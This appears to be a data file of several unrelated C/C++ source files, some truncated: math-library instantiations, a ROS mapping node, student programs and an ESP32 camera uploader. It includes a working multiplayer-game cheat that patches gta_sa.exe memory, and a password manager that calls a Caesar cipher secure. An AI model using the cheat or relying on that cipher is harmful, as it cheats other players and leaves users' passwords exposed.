    "/// @ref core\r\n/// @file glm/glm.cpp\r\n\r\n#ifndef GLM_ENABLE_EXPERIMENTAL\r\n#define GLM_ENABLE_EXPERIMENTAL\r\n#endif\r\n#include <glm/gtx/dual_quaternion.hpp>\r\n#include <glm/gtc/vec1.hpp>\r\n#include <glm/gtc/quaternion.hpp>\r\n#include <glm/ext/scalar_int_sized.hpp>\r\n#include <glm/ext/scalar_uint_sized.hpp>\r\n#include <glm/glm.hpp>\r\n\r\nnamespace glm\r\n{\r\n// tvec1 type explicit instantiation\r\ntemplate struct vec<1, uint8, lowp>;\r\ntemplate struct vec<1, uint16, lowp>;\r\ntemplate struct vec<1, uint32, lowp>;\r\ntemplate struct vec<1, uint64, lowp>;\r\ntemplate struct vec<1, int8, lowp>;\r\ntemplate struct vec<1, int16, lowp>;\r\ntemplate struct vec<1, int32, lowp>;\r\ntemplate struct vec<1, int64, lowp>;\r\ntemplate struct vec<1, float32, lowp>;\r\ntemplate struct vec<1, float64, lowp>;\r\n\r\ntemplate struct vec<1, uint8, mediump>;\r\ntemplate struct vec<1, uint16, mediump>;\r\ntemplate struct vec<1, uint32, mediump>;\r\ntemplate struct vec<1, uint64, mediump>;\r\ntemplate struct vec<1, int8, mediump>;\r\ntemplate struct vec<1, int16, mediump>;\r\ntemplate struct vec<1, int32, mediump>;\r\ntemplate struct vec<1, int64, mediump>;\r\ntemplate struct vec<1, float32, mediump>;\r\ntemplate struct vec<1, float64, mediump>;\r\n\r\ntemplate struct vec<1, uint8, highp>;\r\ntemplate struct vec<1, uint16, highp>;\r\ntemplate struct vec<1, uint32, highp>;\r\ntemplate struct vec<1, uint64, highp>;\r\ntemplate struct vec<1, int8, highp>;\r\ntemplate struct vec<1, int16, highp>;\r\ntemplate struct vec<1, int32, highp>;\r\ntemplate struct vec<1, int64, highp>;\r\ntemplate struct vec<1, float32, highp>;\r\ntemplate struct vec<1, float64, highp>;\r\n\r\n// tvec2 type explicit instantiation\r\ntemplate struct vec<2, uint8, lowp>;\r\ntemplate struct vec<2, uint16, lowp>;\r\ntemplate struct vec<2, uint32, lowp>;\r\ntemplate struct vec<2, uint64, lowp>;\r\ntemplate struct vec<2, int8, lowp>;\r\ntemplate struct vec<2, int16, lowp>;\r\ntemplate struct vec<2, int32, lowp>;\r\ntemplate struct vec<2, int64, lowp>;\r\ntemplate struct vec<2, float32, lowp>;\r\ntemplate struct vec<2, float64, lowp>;\r\n\r\ntemplate struct vec<2, uint8, mediump>;\r\ntemplate struct vec<2, uint16, mediump>;\r\ntemplate struct vec<2, uint32, mediump>;\r\ntemplate struct vec<2, uint64, mediump>;\r\ntemplate struct vec<2, int8, mediump>;\r\ntemplate struct vec<2, int16, mediump>;\r\ntemplate struct vec<2, int32, mediump>;\r\ntemplate struct vec<2, int64, mediump>;\r\ntemplate struct vec<2, float32, mediump>;\r\ntemplate struct vec<2, float64, mediump>;\r\n\r\ntemplate struct vec<2, uint8, highp>;\r\ntemplate struct vec<2, uint16, highp>;\r\ntemplate struct vec<2, uint32, highp>;\r\ntemplate struct vec<2, uint64, highp>;\r\ntemplate struct vec<2, int8, highp>;\r\ntemplate struct vec<2, int16, highp>;\r\ntemplate struct vec<2, int32, highp>;\r\ntemplate struct vec<2, int64, highp>;\r\ntemplate struct vec<2, float32, highp>;\r\ntemplate struct vec<2, float64, highp>;\r\n\r\n// tvec3 type explicit instantiation\r\ntemplate struct vec<3, uint8, lowp>;\r\ntemplate struct vec<3, uint16, lowp>;\r\ntemplate struct vec<3, uint32, lowp>;\r\ntemplate struct vec<3, uint64, lowp>;\r\ntemplate struct vec<3, int8, lowp>;\r\ntemplate struct vec<3, int16, lowp>;\r\ntemplate struct vec<3, int32, lowp>;\r\ntemplate struct vec<3, int64, lowp>;\r\ntemplate struct vec<3, float32, lowp>;\r\ntemplate struct vec<3, float64, lowp>;\r\n\r\ntemplate struct vec<3, uint8, mediump>;\r\ntemplate struct vec<3, uint16, mediump>;\r\ntemplate struct vec<3, uint32, mediump>;\r\ntemplate struct vec<3, uint64, mediump>;\r\ntemplate struct vec<3, int8, mediump>;\r\ntemplate struct vec<3, int16, mediump>;\r\ntemplate struct vec<3, int32, mediump>;\r\ntemplate struct vec<3, int64, mediump>;\r\ntemplate struct vec<3, float32, mediump>;\r\ntemplate struct vec<3, float64, mediump>;\r\n\r\ntemplate struct vec<3, uint8, highp>;\r\ntemplate struct vec<3, uint16, highp>;\r\ntemplate struct vec<3, uint32, highp>;\r\ntemplate struct vec<3, uint64, highp>;\r\ntemplate struct vec<3, int8, highp>;\r\ntemplate struct vec<3, int16, highp>;\r\ntemplate struct vec<3, int32, highp>;\r\ntemplate struct vec<3, int64, highp>;\r\ntemplate struct vec<3, float32, highp>;\r\ntemplate struct vec<3, float64, highp>;\r\n\r\n// tvec4 type explicit instantiation\r\ntemplate struct vec<4, uint8, lowp>;\r\ntemplate struct vec<4, uint16, lowp>;\r\ntemplate struct vec<4, uint32, lowp>;\r\ntemplate struct vec<4, uint64, lowp>;\r\ntemplate struct vec<4, int8, lowp>;\r\ntemplate struct vec<4, int16, lowp>;\r\ntemplate struct vec<4, int32, lowp>;\r\ntemplate struct vec<4, int64, lowp>;\r\ntemplate struct vec<4, float32, lowp>;\r\ntemplate struct vec<4, float64, lowp>;\r\n\r\ntemplate struct vec<4, uint8, mediump>;\r\ntemplate struct vec<4, uint16, mediump>;\r\ntemplate struct vec<4, uint32, mediump>;\r\ntemplate struct vec<4, uint64, mediump>;\r\ntemplate struct vec<4, int8, mediump>;\r\ntemplate struct vec<4, int16, mediump>;\r\ntemplate struct vec<4, int32, mediump>;\r\ntemplate struct vec<4, int64, mediump>;\r\ntemplate struct vec<4, float32, mediump>;\r\ntemplate struct vec<4, float64, mediump>;\r\n\r\ntemplate struct vec<4, uint8, highp>;\r\ntemplate struct vec<4, uint16, highp>;\r\ntempla",
    "/*\r\n\r\n\tSUBJECT:\tSilent NoSpread for SA:MP\r\n\tDESC:\t\tADDRESSES BY M0D_SA\r\n\r\n*/\r\n\r\n\r\n\r\n#include <Windows.h>\r\n#include <tchar.h>\r\n#include <psapi.h>\r\n#include <iostream>\r\n#include <vector>\r\n#include <Tlhelp32.h>\r\n\r\nsize_t r_wcsstr(const wchar_t* str, const wchar_t* search)\r\n{\r\n    for (size_t i = wcslen(str) - wcslen(search); i > 0; --i)\r\n    {\r\n        if (wcsstr(str + i, search) != NULL)\r\n            return i + 1;\r\n    }\r\n\r\n    return -1;\r\n}\r\n\r\nbool GetProcessID(const std::wstring& name, DWORD& pid)\r\n{\r\n    DWORD aProcesses[1024]{ 0 };\r\n    DWORD cbNeeded{ 0 };\r\n    DWORD cProcesses{ 0 };\r\n\r\n    unsigned int i;\r\n\r\n    if (EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded) == 0)\r\n        return false;\r\n\r\n    cProcesses = cbNeeded / sizeof(DWORD);\r\n\r\n    for (i = 0; i < cProcesses; i++)\r\n    {\r\n        WCHAR module_name[MAX_PATH]{ 0 };\r\n        HANDLE process = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ, FALSE, aProcesses[i]);\r\n\r\n        if (process == NULL ||\r\n            GetProcessImageFileNameW(process, module_name, sizeof(module_name) / sizeof(WCHAR)) == 0)\r\n            continue;\r\n\r\n        size_t pos = r_wcsstr(module_name, name.c_str());\r\n\r\n        if (pos != -1)\r\n        {\r\n            pid = aProcesses[i];\r\n            return true;\r\n        }\r\n    }\r\n\r\n    return false;\r\n}\r\n\r\nint main()\r\n{\r\n\r\n\t\r\n\tDWORD ProcessID{ 0 };\r\n\tGetProcessID(L\"gta_sa.exe\", ProcessID);\r\n\tHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, NULL, ProcessID);\r\n\tif (hProcess == NULL)\r\n\t{\r\n\t\treturn 1;\r\n\t}\r\n\r\n\t// Vars\r\n\tDWORD SpreadAddr = 0x8D610F;\r\n\tbool HK = false;\r\n\tchar EnableNoSpreadBytes[] = \"\\xBE\\x00\\x00\\x00\\x00\";\r\n\tchar DisableNoSpreadBytes[] = \"\\xBE\\x00\\x00\\x40\\x3F\";\r\n\r\n\t// MAIN CODE\r\n\tstd::cout << \"Silent NoSpread for SA:MP started.\" << std::endl;\r\n\tstd::cout << \"Press F9 to activate the NoSpread.\";\r\n\twhile (true)\r\n\t{\r\n\r\n\t\tif (GetAsyncKeyState(VK_F9) & 1)\r\n\t\t{\r\n\t\t\tif (!HK)\r\n\t\t\t{\r\n\t\t\t\tWriteProcessMemory(hProcess, (LPVOID)SpreadAddr, &EnableNoSpreadBytes, 5, NULL);\r\n\t\t\t\tstd::cout << \"No Spread has been enabled.\" << std::endl;\r\n\t\t\t\tHK = true;\r\n\t\t\t}\r\n\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tWriteProcessMemory(hProcess, (LPVOID)SpreadAddr, &DisableNoSpreadBytes, 5, NULL);\r\n\t\t\t\tstd::cout << \"No Spread has been disabled.\" << std::endl;\r\n\t\t\t\tHK = false;\r\n\t\t\t}\r\n\t\t}\r\n\t\tSleep(95);\r\n\t}\r\n}\r\n",
    "/*\r\n * Author: Sami\r\n * Email: [tdxfarhan@gmail.com]\r\n * Description:\r\n * This program is a simple yet functional Password Manager developed in C++.\r\n * It allows users to securely store, manage, and retrieve their account credentials \r\n * with features such as:\r\n *   - Adding, viewing, searching, and deleting accounts.\r\n *   - Generating strong random passwords.\r\n *   - Encrypting and decrypting passwords using a basic Caesar cipher for security.\r\n *   - Exporting account data to an HTML file for easier readability.\r\n *\r\n * Core concepts demonstrated in this program:\r\n *   - File I/O operations for data persistence (passwords.txt and passwords.html).\r\n *   - Use of structures (struct) for data encapsulation.\r\n *   - Simple encryption and decryption techniques.\r\n *   - Dynamic memory handling with vectors for account management.\r\n *   - Utility functions for generating random passwords and formatting data.\r\n *\r\n * This project is designed to showcase practical applications of C++ programming\r\n * in solving real-world problems. It reflects my passion for software development\r\n * and serves as a stepping stone toward more advanced projects in the future.\r\n */\r\n\r\n#include <iostream>\r\n#include <fstream>\r\n#include <string>\r\n#include <vector>\r\n#include <iomanip>\r\n#include <cstdlib>\r\n#include <ctime>\r\nusing namespace std;\r\n\r\n// Encrypt and decrypt passwords (simple Caesar cipher)\r\nstd::string encrypt(const std::string& password) {\r\n    std::string encrypted = password;\r\n    for (char& c : encrypted) c += 3; // Shift characters by 3\r\n    return encrypted;\r\n}\r\n\r\nstd::string decrypt(const std::string& password) {\r\n    std::string decrypted = password;\r\n    for (char& c : decrypted) c -= 3; // Shift characters back by 3\r\n    return decrypted;\r\n}\r\n\r\n// Structure to store account details\r\nstruct Account {\r\n    std::string website;\r\n    std::string username;\r\n    std::string password;\r\n};\r\n\r\n// Function prototypes\r\nvoid addAccount();\r\nvoid viewAccounts();\r\nvoid searchAccount();\r\nvoid deleteAccount();\r\nvoid generatePassword();\r\nvoid saveToHTML();\r\n\r\n// Function to add a new account\r\nvoid addAccount() {\r\n    std::ofstream file(\"passwords.txt\", std::ios::app); // Append mode\r\n    if (!file) {\r\n        std::cerr << \"Error opening file.\\n\";\r\n        return;\r\n    }\r\n    Account account;\r\n    std::cout << \"Enter website/app name: \";\r\n    std::cin >> account.website;\r\n    std::cout << \"Enter username: \";\r\n    std::cin >> account.username;\r\n    std::cout << \"Enter password: \";\r\n    std::cin >> account.password;\r\n\r\n    account.password = encrypt(account.password);\r\n\r\n    file << account.website << \" \" << account.username << \" \" << account.password << \"\\n\";\r\n    file.close();\r\n    std::cout << \"Account saved successfully.\\n\";\r\n}\r\n\r\n// Function to view all accounts\r\nvoid viewAccounts() {\r\n    std::ifstream file(\"passwords.txt\");\r\n    if (!file) {\r\n        std::cerr << \"Error opening file.\\n\";\r\n        return;\r\n    }\r\n    Account account;\r\n    std::cout << std::setw(15) << \"Website\" << std::setw(15) << \"Username\" << std::setw(15) << \"Password\\n\";\r\n    std::cout << \"---------------------------------------------------------\\n\";\r\n\r\n    while (file >> account.website >> account.username >> account.password) {\r\n        account.password = decrypt(account.password);\r\n        std::cout << std::setw(15) << account.website << std::setw(15) << account.username << std::setw(15) << account.password << \"\\n\";\r\n    }\r\n    file.close();\r\n}\r\n\r\n// Function to search for an account by website\r\nvoid searchAccount() {\r\n    std::ifstream file(\"passwords.txt\");\r\n    if (!file) {\r\n        std::cerr << \"Error opening file.\\n\";\r\n        return;\r\n    }\r\n    std::string searchWebsite;\r\n    Account account;\r\n    bool found = false;\r\n\r\n    std::cout << \"Enter website/app name to search: \";\r\n    std::cin >> searchWebsite;\r\n\r\n    while (file >> account.website >> account.username >> account.password) {\r\n        if (account.website == searchWebsite) {\r\n            account.password = decrypt(account.password);\r\n            std::cout << \"Website: \" << account.website << \"\\nUsername: \" << account.username\r\n                      << \"\\nPassword: \" << account.password << \"\\n\";\r\n            found = true;\r\n            break;\r\n        }\r\n    }\r\n    if (!found) std::cout << \"No account found for \" << searchWebsite << \".\\n\";\r\n    file.close();\r\n}\r\n\r\n// Function to delete an account\r\nvoid deleteAccount() {\r\n    std::ifstream file(\"passwords.txt\");\r\n    if (!file) {\r\n        std::cerr << \"Error opening file.\\n\";\r\n        return;\r\n    }\r\n    std::vector<Account> accounts;\r\n    Account account;\r\n    std::string deleteWebsite;\r\n    std::cout << \"Enter website/app name to delete: \";\r\n    std::cin >> deleteWebsite;\r\n\r\n    bool deleted = false;\r\n    while (file >> account.website >> account.username >> account.password) {\r\n        if (account.website == deleteWebsite) {\r\n            deleted = true;\r\n            continue;\r\n        }\r\n        accounts.push_back(account);\r\n    }\r\n    file",
    "#include <ros/ros.h>\n#include <sensor_msgs/PointCloud2.h>\n#include <nav_msgs/OccupancyGrid.h>\n#include <pcl/point_cloud.h>\n#include <pcl/point_types.h>\n#include <pcl/io/pcd_io.h>\n#include <pcl_conversions/pcl_conversions.h>\n#include <pcl_ros/point_cloud.h>\n#include <limits>\n\nros::Publisher pcl_pub;\nros::Publisher map_pub;\nnav_msgs::OccupancyGrid occupancy_grid;\n\nvoid publishPointCloud(const pcl::PointCloud<pcl::PointXYZ>::Ptr& cloud)\n{\n    sensor_msgs::PointCloud2 output;\n    pcl::toROSMsg(*cloud, output);\n    output.header.frame_id = \"map\";\n    output.header.stamp = ros::Time::now();\n    pcl_pub.publish(output);\n}\n\nvoid pointCloudCallback(const sensor_msgs::PointCloud2ConstPtr& cloud_msg)\n{\n    pcl::PointCloud<pcl::PointXYZ> cloud;\n    pcl::fromROSMsg(*cloud_msg, cloud);\n\n    int grid_size_x = 380;  \n    int grid_size_y = 450; \n    double grid_resolution = 0.05; \n    std::vector<int8_t> grid_data(grid_size_x * grid_size_y, 0); \n    double origin_x_m = -2.92;\n    double origin_y_m = -4.58;\n\n    for (const auto& point : cloud.points)\n    {\n        int x = static_cast<int>((point.x - origin_x_m) / grid_resolution);\n        int y = static_cast<int>((point.y - origin_y_m) / grid_resolution);\n\n        if (x >= 0 && x < grid_size_x && y >= 0 && y < grid_size_y)\n        {\n            grid_data[y * grid_size_x + x] = 100; \n        }\n    }\n\n    occupancy_grid.header.stamp = ros::Time::now();\n    occupancy_grid.header.frame_id = \"map\";\n    occupancy_grid.info.resolution = grid_resolution;\n    occupancy_grid.info.width = grid_size_x;\n    occupancy_grid.info.height = grid_size_y;\n    occupancy_grid.info.origin.position.x = origin_x_m;\n    occupancy_grid.info.origin.position.y = origin_y_m;\n    occupancy_grid.info.origin.orientation.w = 1.0;\n    occupancy_grid.data = grid_data;\n\n    map_pub.publish(occupancy_grid);\n}\n\nint main(int argc, char** argv)\n{\n    ros::init(argc, argv, \"pcd_publisher\");\n    ros::NodeHandle nh;\n\n    std::string pcd_file_path;\n    nh.param<std::string>(\"pcd_file_path\", pcd_file_path, \"/home/omer/lidar_rotation_system/maps/clean_map_pcd2grid.pcd\");\n\n    if (pcd_file_path.empty())\n    {\n        ROS_ERROR(\"PCD file path not provided! Please set the pcd_file_path parameter.\");\n        return -1;\n    }\n\n    pcl::PointCloud<pcl::PointXYZ>::Ptr cloud(new pcl::PointCloud<pcl::PointXYZ>);\n\n    if (pcl::io::loadPCDFile<pcl::PointXYZ>(pcd_file_path, *cloud) == -1)\n    {\n        ROS_ERROR(\"Couldn't read the PCD file. Please check the file path.\");\n        return -1;\n    }\n\n    ROS_INFO(\"Loaded PCD file with %zu points.\", cloud->points.size());\n\n    pcl_pub = nh.advertise<sensor_msgs::PointCloud2>(\"pcd_topic\", 1);\n    map_pub = nh.advertise<nav_msgs::OccupancyGrid>(\"occupancy_grid_map\", 1);\n\n    ros::Subscriber pcl_sub = nh.subscribe(\"pcd_topic\", 1, pointCloudCallback);\n\n    ros::Rate loop_rate(0.5); // 0.5 Hz\n\n    while (ros::ok())\n    {\n        publishPointCloud(cloud);\n        ros::spinOnce();\n        loop_rate.sleep();\n    }\n\n    return 0;\n}\n",
    "#include <iostream>\n#include \"MyVector.hpp\"\n#include \"Student.hpp\"\n#include <fstream>\n#include <sstream>\n#include <deque> //govorili sme za nego\n#include <stack>\n#include <algorithm> \n#include <climits>\n\n\nbool isValid(const int& row, const int& col, const int& pf, const int& tf){\n    if(row <= 0 || col <= 0 ){\n        std::cerr << \"Rows nor cols can be zero or negative!\" << std::endl;\n        return false;\n    }\n    else if(row*col > 50){\n        std::cerr << \"Only 50 available seats in this hall!\" << std::endl;\n        return false;\n    }\n    else if(pf < 0){\n        std::cerr << \"Minute of arriving professor cannot be negative\" << std::endl;\n        return false;\n    }\n    else if(tf < 0){\n        std::cerr<<\"Time for checking tests cannot be negative\" << std::endl;\n        return false;\n    }\n    return true;\n}\n\nbool isValidPosition(const MyVector<MyVector<int>>& room, int row, int col, int N, int M) {\n    if (row < 0 || row >= N || col < 0 || col >= M) \n        return false;\n    \n    if (room[row][col] == -1)\n        return false;\n\n    int rows[] = {-1, -1, -1, 0, 0, 1, 1, 1};\n    int cols[] = {-1, 0, 1, -1, 1, -1, 0, 1};\n    \n    for (int i = 0; i < 8; i++) {\n        int newRow = row + rows[i];\n        int newCol = col + cols[i];\n        \n        if (newRow >= 0 && newRow < N && newCol >= 0 && newCol < M) {\n            if (room[newRow][newCol] == 1) {\n                return false;\n            }\n        }\n    }\n    return true;\n}\n\nvoid arrangeStudents(MyVector<MyVector<int>>& room, int row, int col, int currentStudents, \n                    int& maxStudents, MyVector<MyVector<int>>& bestArrangement, int N, int M) {\n    if (row >= N) {\n        if (currentStudents > maxStudents) {\n            maxStudents = currentStudents;\n            bestArrangement = room;\n        }\n        return;\n    }\n    \n    if (col >= M) {\n        arrangeStudents(room, row + 1, 0, currentStudents, maxStudents, bestArrangement, N, M);\n        return;\n    }\n    \n    if (room[row][col] == -1) {\n        arrangeStudents(room, row, col + 1, currentStudents, maxStudents, bestArrangement, N, M);\n        return;\n    }\n    \n    if (isValidPosition(room, row, col, N, M)) {\n        room[row][col] = 1;\n        arrangeStudents(room, row, col + 1, currentStudents + 1, maxStudents, bestArrangement, N, M);\n        room[row][col] = 0;\n    }\n\n    arrangeStudents(room, row, col + 1, currentStudents, maxStudents, bestArrangement, N, M);\n}\n\nvoid createRoom(std::ifstream& file, int& professorArriving, int& timeForTests, int& maxStudents) {\n    std::string currentLine;\n    std::getline(file, currentLine);\n    std::istringstream ss(currentLine);\n\n    int row, col;\n    ss >> row >> col >> professorArriving >> timeForTests;\n    \n    if(!isValid(row, col, professorArriving, timeForTests))\n        return;\n    \n    std::getline(file, currentLine);\n    std::istringstream s2(currentLine);\n    int brokenChairs;\n    s2 >> brokenChairs;\n    \n    if(brokenChairs < 0 || brokenChairs > row * col) {\n        std::cerr << \"Invalid number of broken chairs!\" << std::endl;\n        return;\n    }\n\n    MyVector<MyVector<int>> room;\n    for (int i = 0; i < row; ++i) {\n        MyVector<int> currentRow;\n        for (int j = 0; j < col; ++j) {\n            currentRow.push_back(0);\n        }\n        room.push_back(currentRow);\n    }\n\n    std::getline(file, currentLine);\n    std::istringstream s3(currentLine);\n    int currentIndex;\n    while(s3 >> currentIndex) {\n        if(currentIndex < 0 || currentIndex >= row * col) {\n            std::cerr << \"Invalid broken chair index!\" << std::endl;\n            return;\n        }\n        int brokenRow = currentIndex / col;\n        int brokenCol = currentIndex % col;\n        room[brokenRow][brokenCol] = -1;\n    }\n\n    MyVector<MyVector<int>> bestArrangement = room;\n    maxStudents = 0;\n    arrangeStudents(room, 0, 0, 0, maxStudents, bestArrangement, row, col);\n\n    // Print room layout\n    for (int i = 0; i < row; ++i) {\n        for (int j = 0; j < col; ++j) {\n            if(bestArrangement[i][j] == 1)\n                std::cout << \"O\";\n            else if(bestArrangement[i][j] == 0)\n                std::cout << \"F\";\n            else\n                std::cout << \"B\";\n            if (j < col - 1) std::cout << \"\";\n        }\n        std::cout << std::endl;\n    }\n    std::cout << std::endl;\n}\n\nbool valid(const int& ar, const int& id, const int& d, const int& c){\n    //qsno e kakvo proverqvame - info za student\n    return (ar >= 0 && id > 0 && id <= 256 && d > 0 && c >= 2 && c <= 4);\n}\n\nvoid addStudentInQueue(std::deque<Student>& queue, const Student& newStudent) {\n    // ako e prazna q dobavqme v kraq\n    if (queue.empty()) {\n        queue.push_back(newStudent);\n        return;\n    }\n\n    // tursim pravilnata poziciq\n    auto it = queue.begin();\n    while (it != queue.end()) {\n        // ot vtori kurs imat predimstvo\n        if (newStudent.getCourse() == 2 && it->getCourse() != 2) {\n            break;\n        }\n        // ako sa ot edno i sushto po v",
    "#include <iostream>\r\n#include <vector>\r\n#include <algorithm> \r\nusing namespace std;\r\n\r\nstruct Node {\r\n    int data;\r\n    Node* left;\r\n    Node* right;\r\n\r\n    Node(int value) {\r\n        data = value;\r\n        left = right = nullptr;\r\n    }\r\n};\r\n\r\nclass BinaryTree {\r\npublic:\r\n    Node* root;\r\n\r\n    BinaryTree() {\r\n        root = nullptr;\r\n    }\r\n\r\n    Node* insert(Node* node, int value) {\r\n        Node *newnode = new Node(value);\r\n        if (node == nullptr) {\r\n            return newnode;\r\n        }\r\n        if (value < node->data) {\r\n            node->left = insert(node->left, value);\r\n        } else {\r\n            node->right = insert(node->right, value);\r\n        }\r\n        return node;\r\n    }\r\n\r\n    void inorder(Node* node) {\r\n        if (node == nullptr) return;\r\n        inorder(node->left);\r\n        cout << node->data << \" \";\r\n        inorder(node->right);\r\n    }\r\n\r\n    int numberOfNodes(Node* node) {\r\n        if (node == nullptr) return 0;\r\n        return 1 + numberOfNodes(node->left) + numberOfNodes(node->right);\r\n    }\r\n\r\n    int height(Node* node) {\r\n        if (node == nullptr) return 0;\r\n        return 1 + max(height(node->left), height(node->right));\r\n    }\r\n\r\n    bool search(Node* node, int value) {\r\n        if (node == nullptr) return false;\r\n        if (node->data == value) return true;\r\n        if (value < node->data) {\r\n            return search(node->left, value);\r\n        } else {\r\n            return search(node->right, value);\r\n        }\r\n    }\r\n\r\n    Node* findMin(Node* node) {\r\n        while (node->left != nullptr) {\r\n            node = node->left;\r\n        }\r\n        return node;\r\n    }\r\n\r\n    int findMax(Node* node) {\r\n        if (node == nullptr) return -1;\r\n        while (node->right != nullptr) {\r\n            node = node->right;\r\n        }\r\n        return node->data;\r\n    }\r\n\r\n    Node* deleteNode(Node* root, int key) {\r\n        if (root == nullptr) {\r\n            return root;\r\n        }\r\n        if (key < root->data) {\r\n            root->left = deleteNode(root->left, key);\r\n        } else if (key > root->data) {\r\n            root->right = deleteNode(root->right, key);\r\n        } else {\r\n            if (root->left == nullptr) {\r\n                Node* temp = root->right;\r\n                delete root;\r\n                return temp;\r\n            } else if (root->right == nullptr) {\r\n                Node* temp = root->left;\r\n                delete root;\r\n                return temp;\r\n            }\r\n            Node* temp = findMin(root->right);\r\n            root->data = temp->data;\r\n            root->right = deleteNode(root->right, temp->data);\r\n        }\r\n        return root;\r\n    }\r\n\r\n    void printTree(Node* root, int space = 0, int height = 10) {\r\n        if (root == nullptr) {\r\n            return;\r\n        }\r\n        space += height;\r\n        printTree(root->left, space);\r\n        cout << endl;\r\n        for (int i = height; i < space; i++) {\r\n            cout << \" \";\r\n        }\r\n        cout << root->data << \"\\n\";\r\n        printTree(root->right, space);\r\n    }\r\n\r\n    void clearTree(Node* root) {\r\n        if (root == nullptr) {\r\n            return;\r\n        }\r\n        clearTree(root->left);\r\n        clearTree(root->right);\r\n        delete root;\r\n    }\r\n\r\n    bool pathToNode(Node* root, int key, std::vector<int>& path) {\r\n        if (root == nullptr) {\r\n            return false;\r\n        }\r\n        path.push_back(root->data);\r\n        if (root->data == key) {\r\n            return true;\r\n        }\r\n        if (pathToNode(root->left, key, path)) {\r\n            return true;\r\n        }\r\n        if (pathToNode(root->right, key, path)) {\r\n            return true;\r\n        }\r\n        path.pop_back();\r\n        return false;\r\n    }\r\n};\r\n\r\nint main() {\r\n    BinaryTree tree;\r\n\r\n    tree.root = tree.insert(tree.root, 50);\r\n    tree.insert(tree.root, 30);\r\n    tree.insert(tree.root, 70);\r\n    tree.insert(tree.root, 20);\r\n    tree.insert(tree.root, 40);\r\n    tree.insert(tree.root, 60);\r\n    tree.insert(tree.root, 80);\r\n    tree.insert(tree.root, 100);\r\n    tree.insert(tree.root, 19);\r\n    tree.insert(tree.root, 50);\r\n\r\n    cout << \"In-order traversal: \";\r\n    tree.inorder(tree.root);\r\n    cout << endl;\r\n    tree.printTree(tree.root);\r\n\r\n    cout << \"Number of nodes: \" << tree.numberOfNodes(tree.root) << endl;\r\n    cout << \"Height of the tree: \" << tree.height(tree.root) << endl;\r\n\r\n    int searchValue = 40;\r\n    cout << \"Is \" << searchValue << \" present in the tree? \" << (tree.search(tree.root, searchValue) ? \"Yes\" : \"No\") << endl;\r\n\r\n    cout << \"Minimum value in the tree: \" << tree.findMin(tree.root)->data << endl;\r\n    cout << \"Maximum value in the tree: \" << tree.findMax(tree.root) << endl;\r\n\r\n    int key = 40;\r\n    std::vector<int> path;\r\n    if (tree.pathToNode(tree.root, key, path)) {\r\n        std::cout << \"Path to node \" << key << \": \";\r\n        for (int node : path) {\r\n            std::cout << node << \" \";\r\n        }\r\n        std::cout << std::endl;\r\n    } else {\r\n        std::cout << \"No",
    "// Aperture Archive 2\n\n/*********\n  Rui Santos\n  Complete project details at https://RandomNerdTutorials.com/esp32-cam-take-photo-save-microsd-card\n\n  Permission is hereby granted, free of charge, to any person obtaining a copy\n  of this software and associated documentation files.\n  The above copyright notice and this permission notice shall be included in all\n  copies or substantial portions of the Software.\n*********/\n\n// when debugging its recommended to disable multi-wifi for faster connectivity\n// #define ENABLE_MULTI_WIFI TRUE\n\n#define FTP_ENABLE TRUE\n\n// Include necessary libraries for camera and peripherals\n#include <Arduino.h>          // Core Arduino library for ESP32\n#include <esp_camera.h>       // ESP32 Camera functions\n#include <FS.h>               // File system support\n#include <SD_MMC.h>           // SD card access over SDMMC\n#include <soc/soc.h>          // System-on-chip (SoC) definitions\n#include <soc/rtc_cntl_reg.h> // Access to RTC control registers\n#include <driver/rtc_io.h>    // Real-time clock input/output control\n#include <EEPROM.h>           // EEPROM read/write support\n#include <WiFi.h>\n#include <ESP32_FTPClient.h>\n\n#include \"Secrets.h\" // Optional inclusion for private settings\n#include \"Pindef.h\"\n\n#ifdef ENABLE_MULTI_WIFI\n#include <WiFiMulti.h>\n#endif\n\n#ifdef FTP_ENABLE\n#include <WiFiClient.h>\n#endif\n\n// Define EEPROM size (1 byte in this case) for storing persistent data\n#define EEPROM_SIZE 1\n\n// Define pin connections for the AI Thinker ESP32-CAM module\n#define PWDN_GPIO_NUM 32  // Power-down pin for the camera\n#define RESET_GPIO_NUM -1 // Reset pin (not used, set to -1)\n#define XCLK_GPIO_NUM 0   // External clock input for the camera\n#define SIOD_GPIO_NUM 26  // SCCB data pin (I2C SDA)\n#define SIOC_GPIO_NUM 27  // SCCB clock pin (I2C SCL)\n#define Y9_GPIO_NUM 35    // Pixel data bit 9\n#define Y8_GPIO_NUM 34    // Pixel data bit 8\n#define Y7_GPIO_NUM 39    // Pixel data bit 7\n#define Y6_GPIO_NUM 36    // Pixel data bit 6\n#define Y5_GPIO_NUM 21    // Pixel data bit 5\n#define Y4_GPIO_NUM 19    // Pixel data bit 4\n#define Y3_GPIO_NUM 18    // Pixel data bit 3\n#define Y2_GPIO_NUM 5     // Pixel data bit 2\n#define VSYNC_GPIO_NUM 25 // Vertical synchronization signal\n#define HREF_GPIO_NUM 23  // Horizontal reference signal\n#define PCLK_GPIO_NUM 22  // Pixel clock signal\n\nint pictureNumber = 0; // Counter to keep track of picture numbers\n\nunsigned long lastPhotoMillis = 0;\nbool timedOut = false;\n#define SYS_IDLE_TIMEOUT 300000 // system idle timeout in millis 5mins\n\nchar ftp_server[] = FTP_ADDR;\nuint16_t ftp_port = FTP_PORT;\nchar ftp_user[] = FTP_USER;\nchar ftp_pass[] = FTP_PASS;\n\n#ifdef ENABLE_MULTI_WIFI\nWiFiMulti wifiMulti;\n#endif\n\n#ifdef FTP_ENABLE\nESP32_FTPClient ftp(ftp_server, ftp_port, ftp_user, ftp_pass, 5000, 0); // Disable Debug to increase Tx Speed\n#endif\n\n// Camera configuration structure\ncamera_config_t config;\n\n#ifdef FTP_ENABLE\nvoid readAndSendBigBinFile(fs::FS &fs, const char *path, ESP32_FTPClient ftpClient)\n{\n  Serial.printf(\"Attempting to read file: %s\\n\", path);\n\n  ftpClient.InitFile(\"Type I\");\n  ftpClient.NewFile(path);\n\n  File file = fs.open(path);\n  if (!file)\n  {\n    Serial.printf(\"Failed to open file for reading: %s\\n\", path);\n    return;\n  }\n\n  Serial.println(\"Reading file contents...\");\n  while (file.available())\n  {\n    unsigned char buf[1024];\n    int readVal = file.read(buf, sizeof(buf));\n    ftpClient.WriteData(buf, readVal); // Use the actual number of bytes read\n  }\n  